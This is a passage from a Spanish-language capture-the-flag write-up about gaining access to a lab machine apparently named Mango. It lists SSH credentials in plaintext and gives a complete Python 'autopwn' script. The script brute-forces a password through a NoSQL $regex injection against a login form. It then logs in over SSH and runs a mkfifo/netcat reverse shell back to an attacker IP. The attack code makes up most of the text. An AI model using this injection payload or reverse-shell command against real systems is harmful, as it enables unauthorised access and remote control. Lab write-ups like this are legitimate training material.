## Vuln exploit & Gaining Access {-}

### Ganando accesso con ssh {-}

```bash
ssh admin@10.10.10.162
Password: t9KcS3>!0B#2

ssh mango@10.10.10.162
Password: h3mXK8RhU~f{]f5H
```

Hemos ganado accesso al systema como el usuario **mango**.
Vemos que la flag esta en el directorio `/home/admin` tenemos que pasar al usuario admin con el comando `su admin`.

### Autopwn completo para el usuario mango {-}

```python
#!/usr/bin/python3

import pdb # Debugging
from pexpect import pxssh
from pwn import *

def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://staging-order.mango.htb"
characters = string.ascii_letters + string.digits + string.punctuation
lport = 443

def makeRequest():

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando fase de fuerza bruta")
    time.sleep(2)

    p2 = log.progress("Password[mango]")
    password = ""

    for x in range(0, 20):
        for character in characters:

            p1.status("Probando con el caracter %c" % character)

            # NoSQL Injection
            post_data = {
                'username': 'mango',
                'password[$regex]': f"^{re.escape(password + character)}",
                'login': 'login'
            }

            r = requests.post(main_url, data=post_data, allow_redirects=False)

            if r.status_code == 302:
                password += character
                p2.status(password)
                break

    return password

def sshConnection(username, password):

    s = pxssh.pxssh()
    s.login('10.10.10.162', username, password)
    s.sendline("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.3 443 >/tmp/f")
    s.prompt()
    s.logout()

if __name__ == '__main__':

    password = makeRequest()

    try:
        threading.Thread(target=sshConnection, args=('mango', password)).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(lport, timeout=20).wait_for_connection()

    shell.interactive()
```